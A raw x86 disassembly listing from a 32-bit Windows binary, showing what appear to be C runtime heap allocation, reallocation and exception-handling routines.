  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
